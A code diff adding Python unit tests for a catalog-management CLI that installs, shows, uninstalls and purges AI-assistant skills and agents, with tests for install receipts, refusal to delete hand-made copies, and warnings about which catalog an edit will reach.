+        code, out, err = run_cli("list", "--no-pull", "--json")
+        self.assertEqual(code, 0, err)
+        listed = next(i for i in json.loads(out)
+                      if i["name"] == "session-retro" and i["catalog"] == "personal")
+        self.assertEqual(self.show("session-retro")["entry"], listed)
+
+    def test_every_install_of_the_name_is_listed(self) -> None:
+        for argv in ((), ("--project",)):
+            code, _, err = run_cli("use", "session-retro", *argv, "--no-pull", "--json")
+            self.assertEqual(code, 0, err)
+        installs = self.show("session-retro")["installs"]
+        self.assertEqual(sorted(r["scope"] for r in installs), ["global", "project"])
+        self.assertEqual({r["catalog"] for r in installs}, {"personal"})
+
+    def test_a_never_installed_entry_reports_no_installs(self) -> None:
+        payload = self.show("own-dep")
+        self.assertEqual(payload["installs"], [])
+        self.assertEqual(payload["entry"]["state"], "not_installed")
+
+    def test_a_local_source_is_parsed_and_checked(self) -> None:
+        src = self.show("own-dep")["source"]
+        self.assertEqual((src["kind"], src["exists"]), ("local", True))
+
+    def test_a_remote_source_is_broken_into_its_parts(self) -> None:
+        src = self.show("backend-code-practices")["source"]
+        self.assertEqual((src["kind"], src["org"], src["repo"], src["branch"]),
+                         ("github", "acme", "agentics", "main"))
+        self.assertEqual(src["file_path"], "skills/backend-code-practices/SKILL.md")
+
+    def test_an_unparseable_source_is_reported_not_raised(self) -> None:
+        path = self.tool.root / "personal" / "library.yaml"
+        path.write_text(path.read_text().replace(f"{self.src}/own-dep/SKILL.md", "nonsense"))
+        src = self.show("own-dep")["source"]
+        self.assertEqual(src["kind"], "unknown")
+        self.assertIn("unrecognized source format", src["error"])
+
+    def test_has_setup_follows_the_installed_copy(self) -> None:
+        code, _, err = run_cli("use", "session-retro", "--no-pull", "--json")
+        self.assertEqual(code, 0, err)
+        self.assertFalse(self.show("session-retro")["has_setup"])
+        (self.tool.home / ".claude/skills/session-retro/setup.yaml").write_text("version: 1\n")
+        self.assertTrue(self.show("session-retro")["has_setup"])
+
+    def test_the_catalog_restriction_picks_the_other_copy(self) -> None:
+        payload = self.show("session-retro", "--catalog", "shared")
+        self.assertEqual([c["catalog"] for c in payload["copies"]], ["shared"])
+        self.assertEqual(payload["entry"]["catalog"], "shared")
+
+    def test_an_unknown_name_reports_not_found(self) -> None:
+        self.assertEqual(self.show("nope", expect=2)["status"], "NOT_FOUND")
+
+    def test_a_near_miss_reports_candidates(self) -> None:
+        payload = self.show("retro", expect=2)
+        self.assertEqual(payload["status"], "AMBIGUOUS")
+        self.assertEqual({c["name"] for c in payload["candidates"]}, {"session-retro"})
+
+    def test_the_human_output_names_both_copies_and_the_winner(self) -> None:
+        code, out, err = run_cli("show", "session-retro", "--no-pull")
+        self.assertEqual(code, 0, err)
+        self.assertIn("* personal  overrides shared", out)
+        self.assertIn("  shared  overridden by personal", out)
+        self.assertIn("Installed copies: none recorded by this tool", out)
+        self.assertIn("[skill] own-dep", out)  # the resolved dependency
+
+
+class TestUninstall(unittest.TestCase):
+    """Deleting installed copies without touching the catalog (design §4.3)."""
+
+    def setUp(self) -> None:
+        self.tool = TempTool()
+        self.addCleanup(self.tool.stop)
+        self.src = self.tool.root / "sources"
+        for name in ("alpha", "beta"):
+            (self.src / name).mkdir(parents=True)
+            (self.src / name / "SKILL.md").write_text(f"# {name}\n")
+        (self.src / "sql-review.md").write_text("# sql-review\n")
+        self.catalog = install_local_only_fixture(self.tool, f"""\
+library:
+  skills:
+    - name: alpha
+      description: First
+      source: {self.src}/alpha/SKILL.md
+    - name: beta
+      description: Second
+      source: {self.src}/beta/SKILL.md
+  agents:
+    - name: sql-review
+      description: Reviews SQL
+      source: {self.src}/sql-review.md
+  prompts: []
+""")
+
+    def use(self, *argv: str) -> None:
+        code, _, err = run_cli("use", *argv, "--no-pull", "--json")
+        self.assertEqual(code, 0, err)
+
+    def uninstall(self, *argv: str, expect: int = 0) -> dict[str, Any]:
+        code, out, err = run_cli("uninstall", *argv, "--no-pull", "--json")
+        self.assertEqual(code, expect, err or out)
+        payload = json.loads(out)
+        # `uninstall` now reports one result per requested entry. These are all
+        # single-name calls, so flatten the sole result up next to `status` to keep the
+        # assertions reading against `deleted`/`refused` directly. A resolution failure
+        # (NOT_FOUND/AMBIGUOUS) carries no `results`, so it passes through unchanged.
+        if payload.get("results"):
+            return {**payload, **payload["results"][0]}
+        return payload
+
+    @property
+    def global_dest(self) -> Path:
+        return self.tool.home / ".claude/skills/alpha"
+
+    @property
+    def project_dest(self) -> Path:
+        return self.tool.project / ".claude/skills/alpha"
+
+    def test_all_scopes_removes_both_copies_and_their_receipts(self) -> None:
+        self.use("alpha")
+        self.use("alpha", "--project")
+        payload = self.uninstall("alpha")
+        self.assertEqual(payload["status"], "OK")
+        self.assertEqual(sorted(payload["deleted"]),
+                         sorted([str(self.global_dest), str(self.project_dest)]))
+        self.assertFalse(self.global_dest.exists())
+        self.assertFalse(self.project_dest.exists())
+        self.assertEqual(library.load_receipts(), {})
+
+    def test_a_scope_leaves_the_other_copy_alone(self) -> None:
+        self.use("alpha")
+        self.use("alpha", "--project")
+        payload = self.uninstall("alpha", "--scope", "project")
+        self.assertEqual(payload["deleted"], [str(self.project_dest)])
+        self.assertTrue(self.global_dest.exists())
+        self.assertEqual(list(library.load_receipts()), [str(self.global_dest)])
+
+    def test_the_catalog_entry_survives(self) -> None:
+        self.use("alpha")
+        before = self.catalog.read_text()
+        self.uninstall("alpha")
+        self.assertEqual(self.catalog.read_text(), before)
+        code, out, _ = run_cli("list", "--no-pull", "--json")
+        self.assertEqual(code, 0)
+        alpha = next(e for e in json.loads(out) if e["name"] == "alpha")
+        self.assertFalse(alpha["installed"])
+
+    def test_a_single_file_entry_is_deleted_too(self) -> None:
+        self.use("sql-review")
+        dest = self.tool.home / ".claude/agents/sql-review.md"
+        self.assertTrue(dest.is_file())
+        self.assertEqual(self.uninstall("sql-review")["deleted"], [str(dest)])
+        self.assertFalse(dest.exists())
+
+    def test_a_custom_dir_copy_is_deleted_with_the_same_flag_it_was_installed_with(self) -> None:
+        custom = self.tool.root / "elsewhere"
+        code, _, err = run_cli("use", "alpha", "--dir", str(custom), "--no-pull", "--json")
+        self.assertEqual(code, 0, err)
+        self.assertEqual(self.uninstall("alpha", "--dir", str(custom))["deleted"],
+                         [str(custom / "alpha")])
+
+    def test_an_untracked_copy_is_refused(self) -> None:
+        # §4.3: it may be something the user wrote by hand, and this is unrecoverable.
+        self.global_dest.mkdir(parents=True)
+        (self.global_dest / "SKILL.md").write_text("# hand written\n")
+        payload = self.uninstall("alpha", expect=2)
+        self.assertEqual(payload["status"], "REFUSED")
+        self.assertEqual(payload["refused"], [str(self.global_dest)])
+        self.assertTrue(self.global_dest.exists())
+
+    def test_force_overrides_the_refusal(self) -> None:
+        self.global_dest.mkdir(parents=True)
+        (self.global_dest / "SKILL.md").write_text("# hand written\n")
+        payload = self.uninstall("alpha", "--force")
+        self.assertEqual(payload["deleted"], [str(self.global_dest)])
+        self.assertFalse(self.global_dest.exists())
+
+    def test_nothing_installed_is_a_clean_no_op(self) -> None:
+        payload = self.uninstall("alpha")
+        self.assertEqual((payload["deleted"], payload["refused"]), ([], []))
+
+    def test_a_stale_receipt_for_a_deleted_copy_is_pruned(self) -> None:
+        self.use("alpha")
+        shutil.rmtree(self.global_dest)
+        self.uninstall("alpha")
+        self.assertEqual(library.load_receipts(), {})
+
+    def test_an_unknown_name_reports_not_found(self) -> None:
+        payload = self.uninstall("nope", expect=2)
+        self.assertEqual(payload["status"], "NOT_FOUND")
+
+    def test_the_human_output_names_force_when_it_refuses(self) -> None:
+        self.global_dest.mkdir(parents=True)
+        code, out, _ = run_cli("uninstall", "alpha", "--no-pull")
+        self.assertEqual(code, 2)
+        self.assertIn("--force", out)
+
+    def test_several_names_uninstall_in_one_command(self) -> None:
+        self.use("alpha")
+        self.use("beta")
+        code, out, err = run_cli("uninstall", "alpha", "beta", "--scope", "global",
+                                 "--no-pull", "--json")
+        self.assertEqual(code, 0, err or out)
+        payload = json.loads(out)
+        self.assertEqual(payload["status"], "OK")
+        self.assertEqual([r["name"] for r in payload["results"]], ["alpha", "beta"])
+        self.assertFalse((self.tool.home / ".claude/skills/alpha").exists())
+        self.assertFalse((self.tool.home / ".claude/skills/beta").exists())
+
+    def test_a_batch_deletes_what_it_can_and_refuses_the_rest(self) -> None:
+        # A part-done batch: `beta` was installed by the tool, `alpha` was put here by
+        # hand, so the batch removes `beta` and refuses `alpha` rather than forcing both.
+        self.use("beta")
+        self.global_dest.mkdir(parents=True)
+        (self.global_dest / "SKILL.md").write_text("# hand written\n")
+        code, out, _ = run_cli("uninstall", "alpha", "beta", "--scope", "global",
+                               "--no-pull", "--json")
+        self.assertEqual(code, 2)
+        payload = json.loads(out)
+        self.assertEqual(payload["status"], "REFUSED")
+        by_name = {r["name"]: r for r in payload["results"]}
+        self.assertEqual(by_name["alpha"]["refused"], [str(self.global_dest)])
+        self.assertEqual(by_name["beta"]["deleted"],
+                         [str(self.tool.home / ".claude/skills/beta")])
+        self.assertTrue(self.global_dest.exists())  # the hand-made copy survives
+
+    def test_a_typo_in_a_batch_deletes_nothing(self) -> None:
+        self.use("alpha")
+        code, out, _ = run_cli("uninstall", "alpha", "nope", "--scope", "global",
+                               "--no-pull", "--json")
+        self.assertEqual(code, 2)
+        self.assertEqual(json.loads(out)["status"], "NOT_FOUND")
+        self.assertTrue(self.global_dest.exists())  # alpha was not touched
 
 
 class TestWriteTarget(unittest.TestCase):
@@ -4656,6 +7079,140 @@ class TestCatalogRemove(unittest.TestCase):
         self.assertIsNone(payload["purged_clone"])
         self.assertTrue(personal.is_file())  # unregistering is not deleting
 
+    # ── purging what was installed from it (R15.11) ─────────────────────
+    def receipt_for(self, dest: Path, catalog: str, name: str = "alpha",
+                    key: str = "", source: str = "/src/x/SKILL.md") -> None:
+        """Record an install the way `use` would, without needing a real one.
+
+        `key` defaults to empty so these read as *legacy* receipts unless a test says
+        otherwise — which is the state every existing machine is in.
+        """
+        receipts = library.load_receipts()
+        receipts[str(dest)] = {
+            "dest": str(dest), "name": name, "type": "skill", "catalog": catalog,
+            "catalog_key": key, "scope": "global", "source": source, "commit": None,
+            "content_hash": "sha256:x", "installed_at": "2026-01-01T00:00:00Z",
+        }
+        library.save_receipts(receipts)
+
+    def installed_copy(self, name: str) -> Path:
+        dest = self.tool.home / ".claude" / "skills" / name
+        dest.mkdir(parents=True, exist_ok=True)
+        (dest / "SKILL.md").write_text(f"# {name}\n")
+        return dest
+
+    def test_installs_are_kept_unless_asked_for(self) -> None:
+        dest = self.installed_copy("alpha")
+        self.receipt_for(dest, "personal")
+
+        payload = self.remove("personal")
+
+        self.assertEqual(payload["purged_installs"], [])
+        self.assertTrue(dest.is_dir())
+
+    def test_purge_installs_deletes_what_the_receipts_attribute_to_it(self) -> None:
+        """The trap this closes: `uninstall` resolves through the catalog, so once the
+        catalog is unregistered its installed copies cannot be removed by any command —
+        they are invisible to `list` and refused by `uninstall` as NOT_FOUND."""
+        mine = self.installed_copy("alpha")
+        theirs = self.installed_copy("beta")
+        self.receipt_for(mine, "personal")
+        self.receipt_for(theirs, library.SHARED_ID, name="beta")
+
+        payload = self.remove("personal", "--purge-installs")
+
+        self.assertEqual(payload["purged_installs"], [str(mine)])
+        self.assertFalse(mine.exists())
+        # Another catalog's copy is none of this catalog's business.
+        self.assertTrue(theirs.is_dir())
+        self.assertIsNone(library.load_receipts().get(str(mine)))
+
+    def test_a_copy_with_no_receipt_is_left_alone(self) -> None:
+        """Nothing attributes it to any catalog, so it is not this catalog's to delete —
+        the same line `uninstall_entry` draws by refusing a dest it cannot prove it made."""
+        handmade = self.installed_copy("handmade")
+
+        payload = self.remove("personal", "--purge-installs")
+
+        self.assertEqual(payload["purged_installs"], [])
+        self.assertTrue(handmade.is_dir())
+
+    def test_it_purges_a_copy_the_catalog_no_longer_lists(self) -> None:
+        """Receipt-driven, not list-driven, and this is one of the cases that proves it:
+        the entry was removed from the catalog file after being installed, so enumerating
+        the catalog's current entries would miss a copy that is plainly still on disk."""
+        orphan = self.installed_copy("since-removed")
+        self.receipt_for(orphan, "personal", name="since-removed")
+        # The catalog never had this entry, which is the point.
+
+        payload = self.remove("personal", "--purge-installs")
+
+        self.assertEqual(payload["purged_installs"], [str(orphan)])
+        self.assertFalse(orphan.exists())
+
+    def test_a_stale_receipt_is_cleared_rather_than_reported_as_deleted(self) -> None:
+        gone = self.tool.home / ".claude" / "skills" / "already-gone"
+        self.receipt_for(gone, "personal", name="already-gone")
+
+        payload = self.remove("personal", "--purge-installs")
+
+        self.assertEqual(payload["purged_installs"], [])
+        self.assertEqual(payload["cleared_receipts"], [str(gone)])
+        self.assertIsNone(library.load_receipts().get(str(gone)))
+
+    def test_a_renamed_catalog_still_finds_what_it_installed(self) -> None:
+        """R15.12 — the bug that made all of this necessary.
+
+        An id is a nickname the user picks and can change. A machine that re-registered
+        its personal catalog under a new name had 35 receipts naming an id no longer
+        registered, so a purge matched nothing and silently deleted nothing. The recorded
+        source is what rescues those receipts: it did not change when the id did.
+        """
+        personal = self.tool.root / "personal" / "library.yaml"
+        entry_source = yaml.safe_load(personal.read_text())["library"]["skills"][0]["source"]
+        dest = self.installed_copy("alpha")
+        # Written under the *old* id, which no longer matches anything registered.
+        self.receipt_for(dest, "some-old-name", source=entry_source)
+
+        payload = self.remove("personal", "--purge-installs")
+
+        self.assertEqual(payload["purged_installs"], [str(dest)])
+        self.assertFalse(dest.exists())
+
+    def test_an_exact_key_is_not_overridden_by_the_source_fallback(self) -> None:
+        """A receipt that names a different catalog's identity is that catalog's, full stop.
+
+        Otherwise the loose fallback would claw back copies the exact record had already
+        attributed elsewhere, which is how an approximate rule quietly becomes the rule.
+        """
+        personal = self.tool.root / "personal" / "library.yaml"
+        entry_source = yaml.safe_load(personal.read_text())["library"]["skills"][0]["source"]
+        dest = self.installed_copy("alpha")
+        # Same source personal lists, but explicitly recorded as another catalog's copy.
+        self.receipt_for(dest, "elsewhere", key="/somewhere/else/library.yaml",
+                         source=entry_source)
+
+        payload = self.remove("personal", "--purge-installs")
+
+        self.assertEqual(payload["purged_installs"], [])
+        self.assertTrue(dest.is_dir())
+
+    def test_an_install_records_the_catalogs_identity_not_just_its_name(self) -> None:
+        """Going forward there is nothing to infer: the key is recorded at install time."""
+        cfg = library.load_config()
+        entry = cfg.resolve("scratch-thing")
+
+        self.assertEqual(entry.catalog, "personal")
+        self.assertEqual(library.entry_catalog_key(cfg, entry),
+                         str((self.tool.root / "personal" / "library.yaml").resolve()))
+
+    def test_a_catalog_key_survives_the_rename_an_id_does_not(self) -> None:
+        cat = library.load_config().catalogs[0]
+        before = library.catalog_key(cat)
+        cat.id = "renamed-since"
+
+        self.assertEqual(library.catalog_key(cat), before)
+
     def test_removing_from_a_legacy_config_migrates_first(self) -> None:
         self.tool.stop()
         legacy = TempTool()
@@ -4867,10 +7424,14 @@ library:
 
     # ── the ambiguity warning ───────────────────────────────────────────
     def test_a_overridden_name_warns_naming_both_candidate_sources(self) -> None:
+        # `install()` writes the files directly, so there is no receipt — which is exactly
+        # the case this warning is for, and now the only one. The wording says *why* the
+        # provenance is unknown rather than the flat "nothing on disk records" it used to,
+        # which was wrong the moment receipts existed.
         self.install("session-retro", "global", "# my edits\n")
         payload, err = self.push("session-retro")
         self.assertEqual(payload["catalog"], "personal")
-        self.assertIn("nothing on disk records which copy was installed", err)
+        self.assertIn("no install receipt records which copy is on disk", err)
         self.assertIn(str(self.mine / "SKILL.md"), err)   # where it is going
         self.assertIn(str(self.theirs / "SKILL.md"), err)  # the other candidate
         self.assertIn("'shared' →", err)
@@ -4897,6 +7458,53 @@ library:
         payload, err = self.push("only-mine")
         self.assertEqual(payload["catalog"], "personal")
         self.assertNotIn("nothing on disk records", err)
+
+    def test_a_receipt_settles_the_provenance_and_silences_the_warning(self) -> None:
+        """R11.2 — the warning predates receipts, and receipts answer its question.
+
+        `install_receipt` records the catalog and the source a copy came from, so once one
+        exists there is nothing to infer. The old text still said "nothing on disk records
+        which copy was installed" while the receipt beside it recorded exactly that, and it
+        fired on every push of an overridden name — the common case, warned through.
+        """
+        code, _, err = run_cli("use", "session-retro", "--no-pull", "--json")
+        self.assertEqual(code, 0, err)
+
+        payload, err = self.push("session-retro")
+        self.assertEqual(payload["catalog"], "personal")
+        self.assertIsNone(payload["note"])
+        self.assertNotIn("more than one catalog", err)
+
+    def test_a_receipt_from_another_catalog_is_a_sharper_warning_than_ambiguity(self) -> None:
+        """No longer a guess: the edit really is about to land in the wrong repository."""
+        code, _, err = run_cli("use", "session-retro", "--catalog", "shared",
+                               "--no-pull", "--json")
+        self.assertEqual(code, 0, err)
+
+        payload, err = self.push("session-retro", "--catalog", "personal")
+        note = payload["note"]
+        self.assertIn("was installed from 'shared'", note)
+        self.assertIn("targets 'personal'", note)
+        # It names the flag that fixes it rather than only stating the problem.
+        self.assertIn("--catalog shared", note)
+
+    def test_renaming_the_catalog_does_not_invent_a_provenance_mismatch(self) -> None:
+        """R15.12 — the same staleness, in the warning that must not cry wolf.
+
+        The receipt records the id it was installed under. Rename the catalog and a
+        comparison on that id reads as "these files came from somewhere else", which is
+        the one thing this warning exists to say truthfully.
+        """
+        code, _, err = run_cli("use", "session-retro", "--no-pull", "--json")
+        self.assertEqual(code, 0, err)
+
+        raw = yaml.safe_load(library.LOCAL_CONFIG_PATH.read_text())
+        raw["catalogs"][0]["id"] = "renamed-since"
+        library.LOCAL_CONFIG_PATH.write_text(yaml.safe_dump(raw))
+
+        payload, err = self.push("session-retro", "--catalog", "renamed-since")
+        self.assertIsNone(payload["note"])
+        self.assertNotIn("was installed from", err)
 
     def test_the_warning_lists_every_other_catalog_holding_the_name(self) -> None:
         cfg = library.Config(catalogs=[
